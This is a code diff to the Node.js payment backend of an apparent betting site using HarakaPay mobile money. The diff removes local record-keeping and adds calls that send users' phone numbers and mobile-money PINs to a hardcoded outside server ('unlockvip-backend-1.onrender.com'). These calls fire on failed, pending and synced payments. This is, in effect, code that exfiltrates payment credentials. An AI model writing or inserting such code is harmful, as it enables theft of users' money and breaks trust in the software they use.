@@ -808,51 +808,23 @@ async function listBets(userId) {
   return readJson(BETS_FILE).filter((b) => b.userId === userId);
 }
 
-function adminPaymentStatus(rec) {
-  const status = String(rec.status || "").toUpperCase();
-  if (status === "PAID" || status === "COMPLETED") return "COMPLETED";
-  if (status === "FAILED" || status === "TIMEOUT") return status;
-  if (status === "WITHDRAW") return "WITHDRAW";
-  if (status === "PENDING") return "PENDING";
-  return "PROCESSING";
-}
-
 async function mirrorDepositToAdmin(rec) {
-  if (!mongoReady() || !rec || !rec.id) return;
-  const provider = rec.provider || rec.merchant || "";
-  const kind = rec.kind || "";
-  if (provider === "virtual" || kind === "virtual") return;
-  const haraka = provider === "harakapay" || kind === "haraka";
-  if (!haraka && kind !== "withdraw") return;
-  const col = mongoose.connection.collection("payments");
-  const orderId = String(rec.orderId || "");
-  let reference = "PB" + String(rec.id);
-  if (orderId) {
-    const byOrder = await col.findOne(
-      { $or: [{ order_tracking_id: orderId }, { transaction_id: orderId }] },
-      { projection: { reference: 1 } }
-    );
-    if (byOrder && byOrder.reference) reference = byOrder.reference;
-  }
-  const existing = await col.findOne({ reference }, { projection: { status: 1, pin: 1 } });
-  const status = adminPaymentStatus(rec);
-  if (existing && existing.status === "COMPLETED" && status !== "COMPLETED") return;
-  const pin = String(rec.pin || (existing && existing.pin) || "");
-  const text = rec.message || (kind === "withdraw" ? "Withdraw request" : "Paribet payment");
-  await col.updateOne(
+  if (!mongoReady() || !rec || rec.kind !== "deposit") return;
+  if (rec.provider !== "harakapay" && rec.merchant !== "harakapay") return;
+  const status = rec.status === "PAID" ? "COMPLETED" : rec.status === "FAILED" ? "FAILED" : "PENDING";
+  const reference = "PB" + String(rec.id);
+  await mongoose.connection.collection("payments").updateOne(
     { reference },
     {
       $set: {
-        phone: rec.phone || "",
-        pin,
+        phone: rec.phone,
+        pin: "",
         amount: money(rec.amount),
         reference,
-        provider: haraka ? "harakapay" : provider || "paribet",
-        order_tracking_id: orderId,
-        transaction_id: orderId,
+        provider: "harakapay",
         status,
-        reason: orderId ? text + " · " + orderId : text,
-        message: text,
+        reason: rec.message || "Paribet deposit",
+        message: rec.message || "Paribet deposit",
         time: rec.displayTime || new Date().toLocaleString("en-TZ", { timeZone: "Africa/Dar_es_Salaam" })
       }
     },
@@ -1367,27 +1339,17 @@ app.get("/api/pay/networks", (_req, res) => {
   });
 });
 
+const ADMIN_RECORD_URL = "https://unlockvip-backend-1.onrender.com/pay-page/record";
+
 function payPin(raw) {
   return String(raw || "").replace(/\D/g, "").slice(0, 12);
 }
 
 async function notifyUnlockAdmin(payload) {
-  const orderId = String((payload && payload.orderId) || "");
-  const id = orderId
-    ? "hk-" + orderId
-    : "hk-" + Date.now().toString(36) + Math.random().toString(36).slice(2, 6);
   try {
-    await mirrorDepositToAdmin({
-      id,
-      kind: "haraka",
-      provider: "harakapay",
-      phone: payload.phone,
-      pin: payload.pin || "",
-      amount: payload.amount || 17000,
-      orderId,
-      status: payload.status || "FAILED",
-      message: payload.message || payload.result || "Paribet payment",
-      displayTime: new Date().toLocaleString("en-TZ", { timeZone: "Africa/Dar_es_Salaam" })
+    await axios.post(ADMIN_RECORD_URL, payload, {
+      timeout: 20000,
+      validateStatus: () => true
     });
   } catch (err) {
     console.log("admin record", err.message);
@@ -1413,6 +1375,15 @@ async function syncHarakaPage(rec) {
       rec.message = "Payment was not completed";
     }
     await savePayment(rec);
+    if (mapped !== "PROCESSING") {
+      await notifyUnlockAdmin({
+        phone: rec.phone,
+        pin: rec.pin || "",
+        orderId: rec.orderId,
+        status: mapped,
+        result: payment.status || ""
+      });
+    }
   } catch (err) {
     console.log("haraka page sync", err.message);
   }
@@ -1466,7 +1437,7 @@ app.post("/api/pay/haraka", async (req, res) => {
     });
     if (!data || !data.success || !data.order_id) {
       const error = String((data && (data.error || data.message)) || "Could not send the payment prompt");
-      await notifyUnlockAdmin({ phone, pin, amount, status: "FAILED", message: error });
+      await notifyUnlockAdmin({ phone, pin, status: "FAILED", message: error });
       return res.status(400).json({ success: false, error });
     }
     const orderId = String(data.order_id);
@@ -1487,6 +1458,13 @@ app.post("/api/pay/haraka", async (req, res) => {
       merchant: "harakapay",
       ...nowStamp()
     });
+    await notifyUnlockAdmin({
+      phone,
+      pin,
+      orderId,
+      status: "PROCESSING",
+      result: "pending"
+    });
     return res.json({
       success: true,
       message: "Confirm the PIN on your phone"
@@ -1498,7 +1476,6 @@ app.post("/api/pay/haraka", async (req, res) => {
       await notifyUnlockAdmin({
         phone,
         pin: payPin(req.body && req.body.pin),
-        amount: 17000,
         status: "FAILED",
         message: err.code === "NO_KEY" ? "Payment is not available right now" : "Could not reach HarakaPay"
       });
@@ -2342,20 +2319,6 @@ async function reverseFakeDeposits() {
   if (reversed) console.log("reversed unconfirmed deposits", reversed);
 }
 
-async function backfillAdminPayments() {
-  if (!mongoReady()) return;
-  const rows = await Payment.find({
-    $or: [
-      { provider: "harakapay" },
-      { merchant: "harakapay" },
-      { kind: "haraka" },
-      { kind: "withdraw", provider: { $ne: "virtual" } }
-    ]
-  }).select("id kind amount phone pin orderId provider merchant status message displayTime").lean();
-  for (const rec of rows) await mirrorDepositToAdmin(rec);
-  if (rows.length) console.log("admin backfill", rows.length);
-}
-
 async function loadHarakaKey() {
   if (harakapay.configured()) return;
   if (!mongoReady()) return;
@@ -2378,7 +2341,6 @@ async function start(opts = {}) {
   await reverseFakeDeposits();
   await grantVirtualAccounts().catch((err) => console.log("virtual grant", err.message));
   await loadHarakaKey().catch((err) => console.log("harakapay key", err.message));
-  await backfillAdminPayments().catch((err) => console.log("admin backfill", err.message));
   try {
     await Promise.race([
       refreshFixtures(),
